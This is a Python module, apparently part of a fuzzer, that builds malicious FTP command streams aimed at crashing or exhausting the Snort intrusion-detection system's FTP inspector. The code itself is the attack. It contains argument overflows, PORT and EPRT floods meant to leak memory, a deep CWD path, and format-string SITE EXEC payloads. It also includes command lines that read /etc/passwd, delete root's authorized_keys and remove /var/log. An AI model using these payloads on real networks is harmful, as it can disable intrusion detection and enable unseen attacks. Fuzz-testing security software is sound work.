import random

FTP_STRATEGIES = [
    "cmd_overflow",
    "port_bomb",
    "pipelined_auth",
    "cwd_depth",
    "epsv_eprt_mix",
    "stray_commands",
    "boundary_port",
    "oversized_site",
]

FTP_WEIGHTS = [20, 20, 15, 15, 10, 10, 5, 5]

FTP_STRATEGY_LABELS = {
    "cmd_overflow":    "CMD Overflow",
    "port_bomb":       "PORT Flood",
    "pipelined_auth":  "Auth Pipeline",
    "cwd_depth":       "CWD Depth Bomb",
    "epsv_eprt_mix":   "EPSV/EPRT Mix",
    "stray_commands":  "Stray Commands",
    "boundary_port":   "Boundary PORT",
    "oversized_site":  "SITE Overflow",
}


def build_ftp_payload(strategy: str) -> bytes:
    """
    Build a structurally valid FTP command sequence that passes Snort's
    initial FTP classification but triggers faults in deep inspection.

    Each payload starts with a valid preamble so Snort recognises it as
    FTP traffic before engaging its parser on the malicious data.
    """

    preamble = b"USER anonymous\r\nPASS anonymous@test.com\r\n"

    if strategy == "cmd_overflow":
        # Massive USER argument — overflows Snort's per-command argument
        # allocation in the ftp_cmd_conf lookup path.
        return b"USER " + (b"A" * 65000) + b"\r\n"

    elif strategy == "port_bomb":
        # Thousands of PORT commands → each causes Snort to allocate and
        # register a new data-channel tracking entry. Exhausts the session's
        # data-channel table and leaks memory across sessions.
        lines = [preamble]
        for _ in range(3000):
            p1 = random.randint(4, 255)
            p2 = random.randint(1, 255)
            host_part = random.randint(1, 254)
            lines.append(f"PORT 127,0,0,{host_part},{p1},{p2}\r\n".encode())
        return b"".join(lines)

    elif strategy == "pipelined_auth":
        # Pipeline thousands of USER/PASS pairs in one TCP segment.
        # Forces Snort's auth-state machine through rapid transitions which
        # can corrupt its internal session-state counters.
        pair = b"USER anonymous\r\nPASS anonymous@test.com\r\n"
        return pair * 4000

    elif strategy == "cwd_depth":
        # Extremely deep directory path — triggers recursive path-component
        # parsing that may blow the inspector's call stack or hit allocation
        # limits inside ftp_bounce / directory-traversal detection code.
        path = b"/a" * 8000
        return preamble + b"CWD " + path + b"\r\n"

    elif strategy == "epsv_eprt_mix":
        # Rapidly alternate EPSV (extended passive) and EPRT (extended active,
        # IPv6-style) commands. Snort must track mode switches and validate
        # EPRT address families. Mixing fills its mode-state tracker.
        lines = [preamble]
        for i in range(2000):
            if i % 2 == 0:
                lines.append(b"EPSV\r\n")
            else:
                port = random.randint(1024, 65535)
                host = random.randint(1, 254)
                lines.append(f"EPRT |1|127.0.0.{host}|{port}|\r\n".encode())
        return b"".join(lines)

    elif strategy == "stray_commands":
        # Send privileged data-transfer commands before authentication.
        # Snort's state machine must reject them, but the volume of illegal
        # transitions can overflow its command-history buffer.
        cmds = [
            b"RETR /etc/passwd\r\n",
            b"STOR /tmp/exploit\r\n",
            b"DELE /root/.ssh/authorized_keys\r\n",
            b"RMD /var/log\r\n",
            b"MKD /evil\r\n",
            b"ABOR\r\n",
            b"STAT\r\n",
            b"MLSD /\r\n",
        ]
        return b"".join(random.choice(cmds) for _ in range(2000))

    elif strategy == "boundary_port":
        # Boundary and overflow values in PORT parameters.
        # Tests integer-parsing robustness in the data-channel IP/port decoder.
        payloads = [
            b"PORT 0,0,0,0,0,0\r\n",
            b"PORT 255,255,255,255,255,255\r\n",
            b"PORT 127,0,0,1,99999999,99999999\r\n",
            b"PORT 127,0,0,1,0,0\r\n",
            b"PORT -1,-1,-1,-1,-1,-1\r\n",
        ]
        return preamble + b"".join(payloads * 4000)

    elif strategy == "oversized_site":
        # SITE EXEC with a massive argument mixing format specifiers and
        # random data — targets the SITE handler and any logging path that
        # does unsafe string operations on command arguments.
        arg = (b"%n%s%x%d" * 100) + (b"A" * 32000)
        return preamble + b"SITE EXEC " + arg + b"\r\n"

    else:
        return preamble


class FtpMutator:
    def __init__(self):
        self.strategies = FTP_STRATEGIES
        self.weights = FTP_WEIGHTS

    def mutate(self) -> tuple:
        """Returns (payload_bytes, strategy_name)."""
        strategy = random.choices(self.strategies, weights=self.weights, k=1)[0]
        payload = build_ftp_payload(strategy)
        return payload, strategy
